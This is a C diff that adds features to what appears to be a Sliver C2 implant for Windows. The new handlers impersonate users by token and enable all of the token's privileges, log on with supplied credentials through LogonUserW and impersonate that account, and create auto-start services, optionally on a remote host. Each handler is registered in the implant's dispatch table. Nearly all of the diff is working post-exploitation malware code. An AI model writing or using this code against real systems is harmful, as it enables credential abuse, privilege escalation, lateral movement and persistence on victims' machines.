@@ -31,7 +31,6 @@ PENVELOPE CdHandler
 )
 {
 	PPBElement pElement = NULL;
-	DWORD dwNumberOfBytesRead = 0;
 	PBUFFER* pTemp = NULL;
 	LPSTR lpRespData = NULL;
 	PENVELOPE pResult = NULL;
@@ -42,7 +41,11 @@ PENVELOPE CdHandler
 	pElement->Type = Bytes;
 	pElement->dwFieldIdx = 1;
 
-	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
+	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (pTemp == NULL || pTemp[0] == NULL) {
+		goto CLEANUP;
+	}
+
 	lpNewPath = DuplicateStrA(pTemp[0]->pBuffer, 2);
 	if (lpNewPath[lstrlenA(lpNewPath) - 1] != '\\') {
 		lstrcatA(lpNewPath, "\\");
@@ -75,6 +78,299 @@ CLEANUP:
 	FREE(lpNewPath);
 	FREE(lpRespData);
 	FreeElement(pElement);
+
+	return pResult;
+}
+
+PENVELOPE RevToSelfHandler
+(
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID pSliverClient
+)
+{
+	PENVELOPE pResult = NULL;
+	PSLIVER_SESSION_CLIENT pSession = NULL;
+	PGLOBAL_CONFIG pConfig = NULL;
+
+	if (!RevertToSelf()) {
+		LOG_ERROR("RevertToSelf", GetLastError());
+		goto CLEANUP;
+	}
+
+	pSession = (PSLIVER_SESSION_CLIENT)pSliverClient;
+	pConfig = pSession->pGlobalConfig;
+	pConfig->hCurrentToken = GetCurrentProcessToken();
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
+	return pResult;
+}
+
+PENVELOPE ImpersonateHandler
+(
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID pSliverClient
+)
+{
+	PBUFFER* pUmarshaledData = NULL;
+	PPBElement ReqElement = NULL;
+	LPSTR lpUserName = NULL;
+	PENVELOPE pResult = NULL;
+	HANDLE hNewToken = NULL;
+	PSLIVER_SESSION_CLIENT pSession = NULL;
+	PGLOBAL_CONFIG pConfig = NULL;
+	LUID Luid;
+	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
+	PLUID_AND_ATTRIBUTES pPrivilege = NULL;
+	BOOL IsOk = FALSE;
+	DWORD i = 0;
+	CHAR szPrivilegeName[0x80];
+	TOKEN_PRIVILEGES TokenPriv;
+	DWORD cbPrivilegeName = 0;
+
+	ReqElement = ALLOC(sizeof(PBElement));
+	ReqElement->dwFieldIdx = 1;
+	ReqElement->Type = Bytes;
+
+	pUmarshaledData = UnmarshalStruct(&ReqElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (pUmarshaledData == NULL || pUmarshaledData[0] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpUserName = DuplicateStrA(((PBUFFER)pUmarshaledData[0])->pBuffer, 0);
+	hNewToken = ImpersonateUser(lpUserName);
+	if (hNewToken == NULL) {
+		goto CLEANUP;
+	}
+
+	pTokenPrivileges = GetTokenPrivileges(hNewToken);
+	if (pTokenPrivileges == NULL) {
+		goto CLEANUP;
+	}
+
+	for (i = 0; i < pTokenPrivileges->PrivilegeCount; i++) {
+		SecureZeroMemory(szPrivilegeName, sizeof(szPrivilegeName));
+		SecureZeroMemory(&TokenPriv, sizeof(TokenPriv));
+		pPrivilege = &pTokenPrivileges->Privileges[i];
+		cbPrivilegeName = _countof(szPrivilegeName);
+		if (!LookupPrivilegeNameA(NULL, &pPrivilege->Luid, szPrivilegeName, &cbPrivilegeName)) {
+			LOG_ERROR("LookupPrivilegeNameA", GetLastError());
+			continue;
+		}
+
+		if (!LookupPrivilegeValueA(NULL, szPrivilegeName, &TokenPriv.Privileges[0].Luid)) {
+			LOG_ERROR("LookupPrivilegeValueA", GetLastError());
+			continue;
+		}
+		
+		TokenPriv.PrivilegeCount = 1;
+		TokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+		if (!AdjustTokenPrivileges(hNewToken, FALSE, &TokenPriv, 0, NULL, NULL)) {
+			LOG_ERROR("AdjustTokenPrivileges", GetLastError());
+			continue;
+		}
+	}
+
+	IsOk = TRUE;
+	pSession = (PSLIVER_SESSION_CLIENT)pSliverClient;
+	pConfig = pSession->pGlobalConfig;
+	pConfig->hCurrentToken = hNewToken;
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
+	FREE(ReqElement);
+	if (!IsOk && hNewToken != NULL) {
+		RevertToSelf();
+		CloseHandle(hNewToken);
+	}
+	if (pUmarshaledData != NULL) {
+		FREE(pUmarshaledData[0]);
+		FREE(pUmarshaledData);
+	}
+
+	FREE(pTokenPrivileges);
+	FREE(lpUserName);
+	return pResult;
+}
+
+PENVELOPE MakeTokenHandler
+(
+	_In_ PENVELOPE pEnvelope,
+	_In_ LPVOID pSliverClient
+)
+{
+	PPBElement ReqElements[4];
+	LPVOID* pUnmarshaledData = NULL;
+	PENVELOPE pResult = NULL;
+	LPWSTR lpUserName = NULL;
+	LPWSTR lpDomain = NULL;
+	LPWSTR lpPassword = NULL;
+	DWORD dwLogonType = LOGON32_LOGON_NEW_CREDENTIALS;
+	DWORD dwLogonProvider = LOGON32_PROVIDER_DEFAULT;
+	DWORD i = 0;
+	HANDLE hToken = NULL;
+	PSLIVER_SESSION_CLIENT pSession = NULL;
+	PGLOBAL_CONFIG pConfig = NULL;
+	BOOL IsOk = FALSE;
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		ReqElements[i] = ALLOC(sizeof(PBElement));
+		ReqElements[i]->Type = Bytes;
+		ReqElements[i]->dwFieldIdx = i + 1;
+	}
+
+	ReqElements[3]->Type = Varint;
+	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL || pUnmarshaledData[1] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpUserName = ConvertCharToWchar(((PBUFFER)pUnmarshaledData[0])->pBuffer);
+	lpPassword = ConvertCharToWchar(((PBUFFER)pUnmarshaledData[1])->pBuffer);
+	if (pUnmarshaledData[2] != NULL) {
+		lpDomain = ConvertCharToWchar(((PBUFFER)pUnmarshaledData[2])->pBuffer);
+	}
+
+	if (pUnmarshaledData[3] != NULL) {
+		dwLogonType = (DWORD)pUnmarshaledData[3];
+	}
+
+	if (dwLogonType == LOGON32_LOGON_NEW_CREDENTIALS) {
+		dwLogonProvider = LOGON32_PROVIDER_WINNT50;
+	}
+
+	if (!LogonUserW(lpUserName, lpDomain, lpPassword, dwLogonType, dwLogonProvider, &hToken)) {
+		LOG_ERROR("LogonUserW", GetLastError());
+		goto CLEANUP;
+	}
+
+	if (!ImpersonateLoggedOnUser(hToken)) {
+		LOG_ERROR("ImpersonateLoggedOnUser", GetLastError());
+		goto CLEANUP;
+	}
+
+	IsOk = TRUE;
+	pSession = (PSLIVER_SESSION_CLIENT)pSliverClient;
+	pConfig = pSession->pGlobalConfig;
+	pConfig->hCurrentToken = hToken;
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
+	if (!IsOk && hToken != NULL) {
+		CloseHandle(hToken);
+	}
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		FREE(ReqElements[i]);
+	}
+
+	if (pUnmarshaledData != NULL) {
+		FREE(pUnmarshaledData[0]);
+		FREE(pUnmarshaledData[1]);
+		FREE(pUnmarshaledData[2]);
+		FREE(pUnmarshaledData);
+	}
+
+	FREE(lpUserName);
+	FREE(lpPassword);
+
+	return pResult;
+}
+
+PENVELOPE CreateServiceHandler
+(
+	_In_ PENVELOPE pEnvelope
+)
+{
+	PPBElement ReqElements[7];
+	LPVOID* pUnmarshaledData = NULL;
+	PENVELOPE pResult = NULL;
+	DWORD i = 0;
+	LPSTR lpServiceName = NULL;
+	LPSTR lpServiceDesc = NULL;
+	LPSTR lpBinPath = NULL;
+	LPSTR lpHostname = NULL;
+	LPSTR lpDisplayName = NULL;
+	DWORD dwServiceType = SERVICE_WIN32_OWN_PROCESS;
+	DWORD dwStartType = SERVICE_AUTO_START;
+	SC_HANDLE ScManager = NULL;
+	SC_HANDLE ServiceHandle = NULL;
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		ReqElements[i] = ALLOC(sizeof(PBElement));
+		ReqElements[i]->Type = Bytes;
+		ReqElements[i]->dwFieldIdx = i + 1;
+	}
+
+	ReqElements[5]->Type = Varint;
+	ReqElements[6]->Type = Varint;
+	pUnmarshaledData = UnmarshalStruct(ReqElements, _countof(ReqElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
+	if (pUnmarshaledData == NULL || pUnmarshaledData[0] == NULL || pUnmarshaledData[2] == NULL) {
+		goto CLEANUP;
+	}
+
+	lpServiceName = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
+	lpBinPath = DuplicateStrA(((PBUFFER)pUnmarshaledData[2])->pBuffer, 0);
+	if (pUnmarshaledData[1] != NULL) {
+		lpServiceDesc = DuplicateStrA(((PBUFFER)pUnmarshaledData[1])->pBuffer, 0);
+	}
+	
+	if (pUnmarshaledData[3] != NULL) {
+		lpHostname = DuplicateStrA(((PBUFFER)pUnmarshaledData[3])->pBuffer, 0);
+	}
+
+	if (pUnmarshaledData[4] != NULL) {
+		lpDisplayName = DuplicateStrA(((PBUFFER)pUnmarshaledData[4])->pBuffer, 0);
+	}
+
+	if (pUnmarshaledData[5] != NULL) {
+		dwServiceType = (DWORD)pUnmarshaledData[5];
+	}
+
+	if (pUnmarshaledData[6] != NULL) {
+		dwStartType = (DWORD)pUnmarshaledData[6];
+	}
+
+	ScManager = OpenSCManagerA(lpHostname, NULL, SC_MANAGER_ALL_ACCESS);
+	if (ScManager == NULL) {
+		LOG_ERROR("OpenSCManagerA", GetLastError());
+		goto CLEANUP;
+	}
+
+	ServiceHandle = CreateServiceA(ScManager, lpServiceName, lpDisplayName, SERVICE_ALL_ACCESS, dwServiceType, dwStartType, SERVICE_ERROR_NORMAL, lpBinPath, NULL, NULL, NULL, NULL, NULL);
+	if (ServiceHandle == NULL) {
+		LOG_ERROR("CreateServiceA", GetLastError());
+		goto CLEANUP;
+	}
+	
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->uID = pEnvelope->uID;
+CLEANUP:
+	if (ServiceHandle != NULL) {
+		CloseServiceHandle(ServiceHandle);
+	}
+
+	if (ScManager != NULL) {
+		CloseServiceHandle(ScManager);
+	}
+
+	for (i = 0; i < _countof(ReqElements); i++) {
+		FREE(ReqElements[i]);
+	}
+
+	if (pUnmarshaledData != NULL) {
+		for (i = 0; i < 5; i++) {
+			FREE(pUnmarshaledData[i]);
+		}
+
+		FREE(pUnmarshaledData);
+	}
+
+	FREE(lpServiceName);
+	FREE(lpServiceDesc);
+	FREE(lpBinPath);
+	FREE(lpHostname);
+	FREE(lpDisplayName);
 
 	return pResult;
 }
@@ -3876,14 +4172,15 @@ REQUEST_HANDLER* GetSystemHandler()
 	
 	HandlerList[MsgTaskReq] = NULL;
 	HandlerList[MsgProcessDumpReq] = NULL;
-	HandlerList[MsgImpersonateReq] = NULL;
-	HandlerList[MsgRevToSelfReq] = NULL;
+	HandlerList[MsgImpersonateReq] = ImpersonateHandler;
+	HandlerList[MsgRevToSelfReq] = RevToSelfHandler;
 	HandlerList[MsgRunAsReq] = NULL;
 	HandlerList[MsgInvokeGetSystemReq] = NULL;
 	HandlerList[MsgInvokeExecuteAssemblyReq] = NULL;
 	HandlerList[MsgInvokeInProcExecuteAssemblyReq] = NULL;
 	HandlerList[MsgInvokeMigrateReq] = NULL;
 	HandlerList[MsgSpawnDllReq] = NULL;
+	HandlerList[MsgCreateServiceReq] = CreateServiceHandler;
 	HandlerList[MsgStartServiceReq] = NULL;
 	HandlerList[MsgStopServiceReq] = NULL;
 	HandlerList[MsgRemoveServiceReq] = NULL;
@@ -3891,7 +4188,7 @@ REQUEST_HANDLER* GetSystemHandler()
 	HandlerList[MsgUnsetEnvReq] = NULL;
 	HandlerList[MsgScreenshotReq] = NULL;
 	HandlerList[MsgSideloadReq] = NULL;
-	HandlerList[MsgMakeTokenReq] = NULL;
+	HandlerList[MsgMakeTokenReq] = MakeTokenHandler;
 	HandlerList[MsgReconfigureReq] = NULL;
 	HandlerList[MsgSSHCommandReq] = NULL;
 	HandlerList[MsgChtimesReq] = NULL;
@@ -3900,10 +4197,10 @@ REQUEST_HANDLER* GetSystemHandler()
 	HandlerList[MsgListExtensionsReq] = NULL;
 
 	// Pivots
-	HandlerList[MsgPivotStartListenerReq] = PivotStartListenerHandler;
+	/*HandlerList[MsgPivotStartListenerReq] = PivotStartListenerHandler;
 	HandlerList[MsgPivotStopListenerReq] = PivotStopListenerHandler;
 	HandlerList[MsgPivotListenersReq] = PivotListenersHandler;
-	HandlerList[MsgPivotPeerEnvelope] = PivotPeerEnvelopeHandler;
+	HandlerList[MsgPivotPeerEnvelope] = PivotPeerEnvelopeHandler;*/
 
 	return HandlerList;
 }
